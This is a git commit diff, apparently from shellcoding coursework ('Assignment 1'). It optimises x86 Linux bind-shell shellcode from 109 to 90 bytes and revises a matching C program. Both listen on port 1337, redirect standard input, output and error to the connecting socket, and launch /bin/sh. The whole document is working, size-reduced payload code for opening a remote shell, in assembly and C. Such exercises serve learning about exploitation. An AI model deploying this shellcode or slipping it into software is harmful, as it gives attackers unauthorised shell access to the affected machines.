8018260003023deb7bc0b4ffe5d35b8db037c14a
abatchy <abatchy@abatchy.com>
2017-04-29 14:07:17 -0700

    Tweaks to Assignment 1
    Reduced shellcode from 109 bytes to 90 bytes, swapped bash with sh.

--- Assignment 1/bind_shell.asm
+++ Assignment 1/bind_shell.asm
@@ -7,31 +7,33 @@ _start:
     ;   1. http://man7.org/linux/man-pages/man2/socketcall.2.html
     ;   2. http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2210
     ; Call ids are defined in /usr/include/linux/net.h and should be put in EBX
+
+
     ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
     push byte 0x66      ; socketcall()
-    pop eax
-    cdq                 ; zeroes edx, saves a byte
+    pop eax             ; EAX = 0x66
+    cdq                 ; EDX = 0x0 | Saves a byte
     xor ebx, ebx
-    inc ebx             ; #define SYS_SOCKET	1
-                        ; saves us a byte
+    inc ebx             ; EBX = 0x1 | #define SYS_SOCKET	1
+                        ; saves a byte instead of mov bl, 1
     push edx            ; zeroed out earlier
                         ; protocol = 0
     push ebx            ; SOCK_STREAM = 1
-    push 0x2            ; PF_INET = 2
+                        ; Needed for bind(), can be used here to save a few bytes
+    push byte 0x2       ; PF_INET = 2
     mov ecx, esp
     int 0x80
 
     xchg esi, eax       ; sockfd is now stored in esi
 
-    ; bind(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("0.0.0.0")}, 16)
-    xor eax, eax
-    inc ebx             ; #define SYS_BIND	2
-    push eax            ; sockaddr.sin_addr.s_addr: INADDR_ANY = 0
-    push word 0x3905    ; sockaddr.sin_port       : PORT = 1337 (big endian)
-    push word 2         ; sockaddr.sin_family     : AF_INET = 2
+    ; bind(sockfd, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("0.0.0.0")}, 16)
+    push edx            ; sockaddr.sin_addr.s_addr: INADDR_ANY = 0
+    inc ebx             ; EBX = 0x2 | #define SYS_BIND	2
+    push word 0x3905    ; sockaddr.sin_port   : PORT = 1337 (big endian)
+    push bx             ; sockaddr.sin_family : AF_INET = 2
     mov ecx, esp        ; ECX holds pointer to struct sockaddr
 
-    push byte 0x10       ; sizeof(sockaddr)
+    push byte 0x10      ; sizeof(sockaddr)
     push ecx            ; pointer to sockaddr
     push esi            ; sockfd
     mov ecx, esp
@@ -52,9 +54,8 @@ _start:
     ; accept(int sockfd, NULL, NULL);
     ; From man 2 accept: When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.
 
-    xor eax, eax
-    push eax
-    push eax
+    push edx
+    push edx
     push esi
     mov ecx, esp        ; ECX points to args
     inc ebx             ; #define SYS_ACCEPT	5
@@ -62,33 +63,25 @@ _start:
     int 0x80
     
     ; dup2(edi, 1)
-    mov ebx, eax
-    push byte 0x3f
-    pop eax
+    xchg ebx, eax       ; EAX = 0x5, EBX = new_sockfd
     xor ecx, ecx
+lbl:
     mov al, 0x3f
     int 0x80
-    mov al, 0x3f
     inc ecx
-    int 0x80
-    mov al, 0x3f
-    inc ecx
-    int 0x80
+    cmp cl, 0x4
+    jne lbl
     
-    xor eax, eax
-    push eax
-    
+    ; execve("/bin//sh", ["/bin//sh"], NULL)
+    push edx
+
     ; PUSH ////bin/bash (size: 12)
     push 0x68732f2f
     push 0x6e69622f
     
     mov ebx, esp
-    
-    push eax
-    mov edx, esp
-    
-    push ebx
-    mov ecx, esp
+
+    mov ecx, edx
     
     mov al, 0xb
     int 0x80
--- Assignment 1/bind_shell.c
+++ Assignment 1/bind_shell.c
@@ -3,31 +3,39 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-int host_sockid, client_sockid, status, num_bytes, clientaddr_size;
+int host_sockid;    // sockfd for host
+int client_sockid;  // sockfd for client
 	
-struct sockaddr_in hostaddr, clientaddr;
+struct sockaddr_in hostaddr;            // sockaddr struct 
+char* args[] = {"/bin/sh", NULL};       // Args for execve
 
 int main()
 {
+    // Create socket
 	host_sockid = socket(PF_INET, SOCK_STREAM, 0);
 
+    // Initialize sockaddr struct to bind socket using it
 	hostaddr.sin_family = AF_INET;
 	hostaddr.sin_port = htons(1337);
 	hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);
 
+    // Bind socket to IP/Port in sockaddr struct
 	bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));
 	
-	listen(host_sockid, 5);
+    // Listen for incoming connections
+	listen(host_sockid, 2);
 
-	clientaddr_size = sizeof(clientaddr);
-	client_sockid = accept(host_sockid, (struct sockaddr*) &clientaddr, &clientaddr_size);
+    // Accept incoming connection, don't store data, just use the sockfd created
+	client_sockid = accept(host_sockid, NULL, NULL);
 
+    // Duplicate file descriptors for STDIN, STDOUT and STDERR
 	dup2(client_sockid, 0);
 	dup2(client_sockid, 1);
 	dup2(client_sockid, 2);
 
-	execl("/bin/sh","sh", NULL);
-	status  = close(host_sockid);
+    // Execute /bin/sh
+	execve("/bin/sh", NULL, NULL);
+	close(host_sockid);
 	
 	return 0;
 }
